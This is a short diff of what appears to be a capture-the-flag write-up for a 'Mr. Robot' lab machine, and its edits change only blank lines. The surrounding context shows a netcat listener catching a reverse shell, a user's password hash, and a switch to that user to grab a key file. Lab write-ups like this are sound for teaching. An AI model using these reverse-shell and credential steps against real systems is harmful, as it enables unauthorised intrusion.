@@ -224,8 +224,6 @@ listening on [any] 1234 ...
 ```
 
 ![](https://i.imgur.com/dvCMWwp.png)
-
-
 * Reverse connection success
 ```java
 [11:55:51] root:mrrobot # nc -lvp 1234
@@ -290,6 +288,7 @@ robot:c3fcd3d76192e4007dfb496cca67e13b
 ![](https://i.imgur.com/avPNkKD.png)
 
 * Change user from daemon to robot, and get key-2-of-3.txt success.
+  
 ```java
 daemon@linux:/home/robot$ su robot 
 su robot 
